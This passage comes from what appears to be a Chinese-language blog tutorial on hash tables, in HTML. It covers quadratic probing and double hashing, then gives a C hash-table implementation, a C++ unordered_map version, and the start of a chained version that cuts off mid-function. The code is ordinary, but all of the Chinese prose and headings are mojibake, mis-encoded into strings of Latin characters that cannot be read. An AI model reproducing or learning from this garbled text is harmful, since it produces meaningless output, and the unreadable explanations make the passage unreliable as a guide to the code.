æ™‚ï¼Œå¦‚æœé‡åˆ°è¡çªï¼Œä¹Ÿéœ€è¦å‘å¾Œæœå°‹ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€å€‹ç©ºçš„ä½ç½®æ‰åœæ­¢æœå°‹ã€‚</p><p><strong>ç¼ºé»</strong>ï¼šHash Table æ”¯æ´åˆªé™¤æ“ä½œï¼Œä½†è¢«åˆªé™¤çš„å…ƒç´ éœ€è¦æ¨™è¨˜ï¼Œå¦å‰‡ç›´æ¥åˆªé™¤æœƒå°è‡´å¾ŒçºŒçš„æœå°‹éç¨‹è¢«ä¸­æ–·ã€‚</p><h3 id="Quadratic-probing"><a href="#Quadratic-probing" class="headerlink" title="Quadratic probing"></a>Quadratic probing</h3><p>å¯ä»¥ç”¨ä¾†è§£æ±º Linear Probing æ•ˆç‡ä½ï¼ŒLinear Probing åœ¨æ’å…¥å…ƒç´ å¤šçš„æ™‚å€™ï¼Œåœ¨å°‹å€æ™‚ä¹Ÿæœƒæ•ˆç‡ç·©æ…¢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash(key)+<span class="number">1</span>, hash(key)+<span class="number">2</span>, hash(key)+<span class="number">3</span>,â€¦..hash(key)+n</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨ Quadratic probing çš„æ™‚å€™å°‡å°‹å€æ–¹å¼æ”¹æˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash(key)+ <span class="number">1</span>^<span class="number">2</span> , hash(key)+ <span class="number">2</span>^<span class="number">2</span>, hash(key)+<span class="number">3</span>^<span class="number">2</span></span><br></pre></td></tr></table></figure><p>æ¯æ¬¡éƒ½å¢åŠ  <code>n^2</code> ä¾†æ‰¾ç©ºä½å€</p><h3 id="Double-hashing"><a href="#Double-hashing" class="headerlink" title="Double hashing"></a>Double hashing</h3><p>å¦å¤–ï¼Œè‹¥æœ‰è¡çªç™¼ç”Ÿï¼Œä¹Ÿå¯ä»¥ç›´æ¥å†è·‘å¦ä¸€å€‹ Hash Functionï¼Œä¹Ÿå°±æ˜¯ç•¶è¡çªç™¼ç”Ÿæ™‚ï¼Œ<strong>æŒçºŒé€²è¡Œhash ç›´åˆ°è¡çªçµæŸ</strong></p><p>$index_{n} &#x3D; F_{1}(k) + (n-1)* F_{2}(k)$ ç›´åˆ°æ‰¾åˆ°æœ€å¾Œçš„ indexç‚ºæ­¢</p><h3 id="é–‹æ”¾å°‹å€æ³•çš„å„ªç¼ºé»ï¼š"><a href="#é–‹æ”¾å°‹å€æ³•çš„å„ªç¼ºé»ï¼š" class="headerlink" title="é–‹æ”¾å°‹å€æ³•çš„å„ªç¼ºé»ï¼š"></a>é–‹æ”¾å°‹å€æ³•çš„å„ªç¼ºé»ï¼š</h3><p><strong>å„ªé»ï¼š</strong></p><p>Open addressing æ–¹æ³•ä¸ä½¿ç”¨éˆçµä¸²åˆ—ï¼Œæ‰€æœ‰è³‡æ–™éƒ½å­˜æ”¾åœ¨ Array ä¸­ï¼Œæœ‰åŠ©æ–¼é€šéå¿«å–åŠ å¿«å­˜å–é€Ÿåº¦ã€‚</p><p><strong>ç¼ºé»ï¼š</strong></p><p>åˆªé™¤è³‡æ–™è¼ƒç‚ºéº»ç…©ï¼Œéœ€è¦ç‰¹åˆ¥æ¨™è¨˜è¦åˆªé™¤çš„æ•¸æ“šã€‚<br>æ‰€æœ‰è³‡æ–™éƒ½å­˜æ”¾åœ¨åŒä¸€å€‹ hash table ä¸­ï¼Œç™¼ç”Ÿè¡çªçš„ä»£åƒ¹è¼ƒé«˜ï¼Œå› æ­¤ load factor ä¸å®œå¤ªé«˜ï¼Œé€™ä½¿å¾—é€™ç¨®æ–¹æ³•æ¯”è¼ƒæµªè²»è¨˜æ†¶é«”ã€‚</p><h1 id="Hash-Table-å¯¦ä½œ"><a href="#Hash-Table-å¯¦ä½œ" class="headerlink" title="Hash Table å¯¦ä½œ"></a>Hash Table å¯¦ä½œ</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// in order to use bool function in C</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_NAME 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TABLE_SIZE 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> name[MAX_NAME];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;person; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">person *hash_table[TABLE_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init_hash_table</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_table</span><span class="params">()</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_insert</span><span class="params">(person *p)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_delete</span><span class="params">(person *p)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init_hash_table();</span><br><span class="line"></span><br><span class="line">    person Walt=&#123;.name=<span class="string">&quot;Walt&quot;</span>,.age=<span class="number">26</span>&#125;;</span><br><span class="line">    person Skyler=&#123;.name=<span class="string">&quot;Skyler&quot;</span>,.age=<span class="number">27</span>&#125;;</span><br><span class="line">    person Saul=&#123;.name=<span class="string">&quot;Saul&quot;</span>,.age=<span class="number">28</span>&#125;;</span><br><span class="line">    person Mike=&#123;.name=<span class="string">&quot;Mike&quot;</span>,.age=<span class="number">29</span>&#125;;</span><br><span class="line">    person Hank=&#123;.name=<span class="string">&quot;Hank&quot;</span>,.age=<span class="number">30</span>&#125;;</span><br><span class="line">    person Mary=&#123;.name=<span class="string">&quot;Mary&quot;</span>,.age=<span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//add person into hash_table</span></span><br><span class="line">    hash_table_insert(&amp;Walt);</span><br><span class="line">    hash_table_insert(&amp;Skyler);</span><br><span class="line">    hash_table_insert(&amp;Saul);</span><br><span class="line">    hash_table_insert(&amp;Mike);</span><br><span class="line">    hash_table_insert(&amp;Hank);</span><br><span class="line">    hash_table_insert(&amp;Mary);</span><br><span class="line"></span><br><span class="line">    print_table();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//delete persion in hash table</span></span><br><span class="line">    hash_table_delete(&amp;Walt);</span><br><span class="line">    print_table();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//define the hash function</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">char</span> *name)</span>&#123;</span><br><span class="line">    <span class="type">int</span> length=strnlen(name, MAX_NAME);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hash_value=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">        hash_value+=name[i];</span><br><span class="line">        hash_value=(hash_value*name[i])%TABLE_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//initialize the hash table to NULL (let it be empty)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_hash_table</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;TABLE_SIZE;i++)&#123;</span><br><span class="line">        hash_table[i]=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print out the hash table</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_table</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------Start--------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;TABLE_SIZE;i++)&#123;</span><br><span class="line">        <span class="comment">//nothing in the hash table</span></span><br><span class="line">        <span class="keyword">if</span>(hash_table[i]==<span class="literal">NULL</span>) <span class="built_in">printf</span>(<span class="string">&quot;\t%d\t---\n&quot;</span>,i);</span><br><span class="line">        <span class="comment">//something in the hash table</span></span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;\t%d\t%s\n&quot;</span>,i,hash_table[i]-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------End----------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//insert the element into the hash_table</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_insert</span><span class="params">(person *p)</span>&#123;</span><br><span class="line">    <span class="comment">//make sure not call this function with null ptr</span></span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//insert the person into the index return by hash_function</span></span><br><span class="line">    <span class="type">int</span> index=hash(p-&gt;name);</span><br><span class="line">    <span class="comment">//check the pointer at that index in the table is null or not</span></span><br><span class="line">    <span class="keyword">if</span>(hash_table[index]!=<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//collision, somebody had occupied there already</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//if no one occupied there, then occupied the address</span></span><br><span class="line">    hash_table[index]=p;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_delete</span><span class="params">(person *p)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// to avoid null ptr</span></span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get index</span></span><br><span class="line">    <span class="type">int</span> index=hash(p-&gt;name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hash_table[index]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        hash_table[index] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨ C++ã€€STL å†åˆ·é¡Œæ™‚æœƒæ–¹ä¾¿æ›´å¤š:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    string name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unordered_map&lt;string, Person&gt; hash_table;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_hash_table</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_table</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hash_table_insert</span><span class="params">(<span class="type">const</span> Person&amp; p)</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hash_table_delete</span><span class="params">(<span class="type">const</span> string&amp; name)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">init_hash_table</span>();</span><br><span class="line"></span><br><span class="line">    Person Walt = &#123;.name = <span class="string">&quot;Walt&quot;</span>, .age = <span class="number">26</span>&#125;;</span><br><span class="line">    Person Skyler = &#123;.name = <span class="string">&quot;Skyler&quot;</span>, .age = <span class="number">27</span>&#125;;</span><br><span class="line">    Person Saul = &#123;.name = <span class="string">&quot;Saul&quot;</span>, .age = <span class="number">28</span>&#125;;</span><br><span class="line">    Person Mike = &#123;.name = <span class="string">&quot;Mike&quot;</span>, .age = <span class="number">29</span>&#125;;</span><br><span class="line">    Person Hank = &#123;.name = <span class="string">&quot;Hank&quot;</span>, .age = <span class="number">30</span>&#125;;</span><br><span class="line">    Person Mary = &#123;.name = <span class="string">&quot;Mary&quot;</span>, .age = <span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add persons into hash_table</span></span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Walt);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Skyler);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Saul);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Mike);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Hank);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Mary);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print_table</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Delete person from hash table</span></span><br><span class="line">    <span class="built_in">hash_table_delete</span>(<span class="string">&quot;Walt&quot;</span>);</span><br><span class="line">    <span class="built_in">print_table</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_hash_table</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    hash_table.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_table</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;--------Start--------&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; pair : hash_table) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; pair.first &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; pair.second.name &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;--------End----------&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hash_table_insert</span><span class="params">(<span class="type">const</span> Person&amp; p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> result = hash_table.<span class="built_in">insert</span>(&#123;p.name, p&#125;);</span><br><span class="line">    <span class="keyword">return</span> result.second; <span class="comment">// True if insertion took place, false if key already existed</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hash_table_delete</span><span class="params">(<span class="type">const</span> string&amp; name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> hash_table.<span class="built_in">erase</span>(name) &gt; <span class="number">0</span>; <span class="comment">// True if element was removed, false if key didn&#x27;t exist</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ·»åŠ ç¢°æ’è™•ç†"><a href="#æ·»åŠ ç¢°æ’è™•ç†" class="headerlink" title="æ·»åŠ ç¢°æ’è™•ç†"></a>æ·»åŠ ç¢°æ’è™•ç†</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_NAME 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TABLE_SIZE 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[MAX_NAME];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">person</span> *<span class="title">next</span>;</span> <span class="comment">// pointer to the next person in the list</span></span><br><span class="line">&#125; person;</span><br><span class="line"></span><br><span class="line">person *hash_table[TABLE_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init_hash_table</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_table</span><span class="params">()</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_insert</span><span class="params">(person *p)</span>;</span><br><span class="line">person* <span class="title function_">hash_table_lookup</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_delete</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    init_hash_table();</span><br><span class="line"></span><br><span class="line">    person Walt = &#123;.name = <span class="string">&quot;Walt&quot;</span>, .age = <span class="number">26</span>&#125;;</span><br><span class="line">    person Skyler = &#123;.name = <span class="string">&quot;Skyler&quot;</span>, .age = <span class="number">27</span>&#125;;</span><br><span class="line">    person Saul = &#123;.name = <span class="string">&quot;Saul&quot;</span>, .age = <span class="number">28</span>&#125;;</span><br><span class="line">    person Mike = &#123;.name = <span class="string">&quot;Mike&quot;</span>, .age = <span class="number">29</span>&#125;;</span><br><span class="line">    person Hank = &#123;.name = <span class="string">&quot;Hank&quot;</span>, .age = <span class="number">30</span>&#125;;</span><br><span class="line">    person Mary = &#123;.name = <span class="string">&quot;Mary&quot;</span>, .age = <span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add persons into hash_table</span></span><br><span class="line">    hash_table_insert(&amp;Walt);</span><br><span class="line">    hash_table_insert(&amp;Skyler);</span><br><span class="line">    hash_table_insert(&amp;Saul);</span><br><span class="line">    hash_table_insert(&amp;Mike);</span><br><span class="line">    hash_table_insert(&amp;Hank);</span><br><span class="line">    hash_table_insert(&amp;Mary);</span><br><span class="line"></span><br><span class="line">    print_table();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Delete person from hash table</span></span><br><span class="line">    hash_table_delete(<span class="string">&quot;Walt&quot;</span>);</span><br><span class="line">    print_table();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define the hash function</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">char</span> *name)</span> &#123;</span><br><span class="line">    <span class="type">int</span> length = strnlen(name, MAX_NAME);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hash_value = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        hash_value += name[i];</span><br><span class="line">        hash_value = (hash_value * name[i]) % TABLE_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize the hash table to NULL (let it be empty)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_hash_table</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TABLE_SIZE; i++) &#123;</span><br><span class="line">        hash_table[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Print out the hash table</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_table</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------Start--------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TABLE_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hash_table[i] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\t%d\t---\n&quot;</span>, i);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            person *tmp = hash_table[i];</span><br><span class="line">            <span class="keyword">while</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\t%d\t%s\n&quot;</span>, i, tmp-&gt;name);</span><br><span class="line">                tmp = tmp-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------End----------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert the element into the hash_table</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_insert</span><span class="params">(person *p)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index = hash(p-&gt;name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Insert at the head of the list</span></span><br><span class="line">    